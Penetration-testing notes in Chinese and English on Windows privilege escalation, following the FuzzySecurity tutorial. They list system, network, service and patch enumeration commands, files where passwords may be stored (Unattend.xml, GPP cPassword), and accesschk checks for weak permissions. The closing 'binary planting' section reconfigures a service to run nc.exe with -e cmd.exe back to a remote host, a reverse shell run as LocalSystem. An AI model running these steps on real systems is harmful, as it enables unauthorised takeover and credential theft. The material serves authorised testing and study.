#  Windows #

[Windows提权](https://www.fuzzysecurity.com/tutorials/16.html)
# Δt for t0 to t3 - Initial Information Gathering #
## 1.系统
    C:\Windows\system32> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    
    C:\Windows\system32> hostname
    
    C:\Windows\system32> echo %username%
    
## 2.网络

    C:\Windows\system32> net user

    C:\Windows\system32> net user user1

    C:\Windows\system32> ipconfig /all
    
    C:\Windows\system32> route print

*arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.*

C:\Windows\system32> arp -A

C:\Windows\system32> netstat -ano

## 3.防火墙    
    C:\Windows\system32> netsh firewall show config

    C:\Windows\system32> netsh firewall show state

>This will display verbose output for all scheduled tasks, below you can see sample output for a
> single task.系统计划内的任务
> 要用英文编码才能运行：chcp 437
> 中文编码：chcp 936

    C:\Windows\system32> schtasks /query /fo LIST /v

> The following command links running processes to started services.

    
    C:\Windows\system32> tasklist /SVC

    C:\Windows\system32> net start


> This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes
> than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.
> 查看系统驱动

    C:\Windows\system32> DRIVERQUERY

## Δt for t4 - The Arcane Arts Of WMIC ##
## 4.wmic命令行 ##
(Windows Management Instrumentation Command-Line)

[wmic具体解释](https://www.computerhope.com/wmic.htm )

[比CMD更强大的命令行：WMIC后渗透利用（系统命令](https://www.freebuf.com/articles/system/182531.html#）)

[WMI在渗透测试中的重要性](https://zhuanlan.zhihu.com/p/37765866)
>1. 检索系统已安装的软件
 
    wmic product list brief |more

>2. 搜索系统运行服务

     wmic service list brief |more

>3. 搜索运行中的程序

     wmic process list brief |more

>4. 搜索启动

     wmic startup list brief |more


## Δt for t5 to t6 - Quick Fails ##

>qfe quick fix engineering
>查看补丁
>
    C:\Windows\system32> wmic qfe get Caption,Description,HotFixID,InstalledOn

>查该系统有没有你希望可以利用的漏洞
>
    C:\Windows\system32> wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."


此外，有可能在以下文件中会包含系统用户的账号密码，也有可能在其他文件夹中，应该查看整个系统

c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

除了Groups.xml之外，其他几个策略首选项文件可能有可选的“cPassword”属性，这些都是可在[here](https://docs.microsoft.com/en-us/openspecs/main/ms-openspeclp/3589baea-5b22-48f2-9d43-f5bea4960ddb)查到的：
Services\Services.xml: Element-Specific Attributes

ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element

Printers\Printers.xml: SharedPrinter Element

Drives\Drives.xml: Element-Specific Attributes

DataSources\DataSources.xml: Element-Specific Attributes


可以通过以下途径得到这些信息：
1.metasploit的模块：[地址](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)
2.powersploit里的一个方法Get-GPPPassword：[http://github.com/PowerShellMafia/PowerSploit](http://https://github.com/PowerShellMafia/PowerSploit "github地址")



# Δt for t7 to t10 - Roll Up Your Sleeves #



>We can use sc to query, configure and manage windows services. SC 是用于与服务控制管理器和服务进行通信的命令行程序。

    C:\Windows\system32> sc qc Spooler

可以通过[超链接](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)下载Microsoft's Sysinternals Suite，利用里面的accesschk.exe可以查询每项服务所需的权限。



// Service permissions

    sc query
    
    sc qc [service_name]
    

// Accesschk stuff

    accesschk.exe /accepteula (always do this first!!!!!)
    
    accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
    
    accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)

    accesschk.exe -ucqv [service_name]

// Find all weak folder permissions per drive.

    accesschk.exe -uwdqs Users c:\

    accesschk.exe -uwdqs "Authenticated Users" c:\
    

// Find all weak file permissions per drive.

    accesschk.exe -uwqs Users c:\*.*

    accesschk.exe -uwqs "Authenticated Users" c:\*.*
    
// Binary planting

    sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"

    sc config [service_name] obj= ".\LocalSystem" password= ""

    sc qc [service_name] (to verify!)

    net start [service_name]